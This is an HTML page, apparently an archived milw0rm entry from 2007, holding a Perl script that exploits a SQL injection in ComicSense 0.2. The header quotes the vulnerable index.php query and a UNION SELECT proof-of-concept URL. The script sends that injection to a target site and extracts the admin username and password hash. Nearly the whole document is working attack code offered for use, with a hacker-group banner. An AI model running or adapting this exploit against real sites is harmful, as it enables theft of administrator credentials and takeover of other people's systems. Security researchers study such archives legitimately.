<html><head><title>Comicsense 0.2 (index.php epi) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#										#
#		  	ComicSense 0.2 SQL Injection Exploit   			#
#										#
# Discovered by: s0cratex							#
# Payload: Admin Username &amp; Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
#										#
# Original Advisory: http://seclists.org/bugtraq/2007/Jun/0063.html		#
#		     http://milw0rm.com/exploits/4035				#
# 										#
# Vulnerable Code (index.php): 							#
#										#
#      $sqlQuery = &quot;SELECT * FROM &quot; . $prefix . &quot;comic WHERE episodenr = $epi&quot;; #
#										#
# PoC: http://victim.com/index.php?epi=-999 UNION SELECT username,0,password 	#
#      FROM users LIMIT 1							#
# 										#
# Subject To: Nothing								#
# GoogleDork: Get your own!							#
#										#
# Shoutz: The entire w4ck1ng community &amp; s0cratex				#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV &lt; 1){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;               	 ComicSense 0.2 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: w4ck1ng_comicsense.pl [PATH]\r\n\r\n&quot;;
print &quot;[PATH] = Path where ComicSense is located\r\n\r\n&quot;;
print &quot;e.g. w4ck1ng_comicsense.pl http://victim.com/comic/\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
exit();
}

$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . &quot;index.php?epi=-999 UNION SELECT username,0,password FROM users LIMIT 1&quot;;

$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
$res-&gt;content =~ /.jpg&quot; alt=&quot;#(.*?):/;

  ($user) = $res-&gt;content =~ /.jpg&quot; alt=&quot;#(.*?):/;
  ($hash) = $res-&gt;content =~ /: ([0-9a-fA-F]{32})&quot; \/&gt;/;

if($user &amp;&amp; $hash){

print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;               	 ComicSense 0.2 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;[+] Admin User : $user\n&quot;;
print &quot;[+] Admin Hash : $hash\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
} else {
  print &quot;\nExploit Failed...\n&quot;;
}

# milw0rm.com [2007-06-06]</pre></html>